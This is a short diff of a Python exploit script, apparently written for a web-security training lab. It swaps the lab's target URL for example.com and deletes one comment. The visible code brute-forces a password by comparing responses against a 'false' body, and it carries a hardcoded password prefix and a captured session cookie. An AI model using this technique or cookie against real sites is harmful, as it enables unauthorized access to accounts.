@@ -35,7 +35,7 @@ def brute_force_password(session, url, headers):
     false_body = false_response.text
     password = "5b317d17-3ee3-486"
 
-    # If a starting prefix is provided and already matches exactly, we're done.
+    
     if password:
         if is_match(session, url, headers, build_payload(password, exact=True), false_body):
             print(f"Password found (start prefix): {password}")
@@ -61,7 +61,7 @@ def brute_force_password(session, url, headers):
 
 def exploit():
     
-    url = "https://ptl-eeba7202b4f0-409b59356849.libcurl.me/"
+    url = "https://example.com/"
     
     headers = {
         "Cookie": "rack.session=BAh7CEkiD3Nlc3Npb25faWQGOgZFVEkiRWJmYzRkNDBmNTUzOGVjNmU3ZTEw%0AMzA3Y2ViYzg0YjBlMTA1Yzc1OTUxNjY1YjgzYjk5Yzc4YTcxOTgxNTY5MjAG%0AOwBGSSIJY3NyZgY7AEZJIiVhNTA4ZWQ4MTYwZDdkMDQ5ZDkzMjQyYzRkMDc3%0ANjYzMwY7AEZJIg10cmFja2luZwY7AEZ7B0kiFEhUVFBfVVNFUl9BR0VOVAY7%0AAFRJIi0xZjM3OWIwNDllNzFmZTYwN2FmZjRmMGEzMThlNTQ2Nzk2NjFmZGY4%0ABjsARkkiGUhUVFBfQUNDRVBUX0xBTkdVQUdFBjsAVEkiLWRkMDY1ZWQyNjNj%0ANjdkNzk5Zjk0M2FiNmMzOWI1NWM1ZTAwOGNiYjUGOwBG%0A--bb6f9af202e59fba335b5a19888fcba79e17e077",
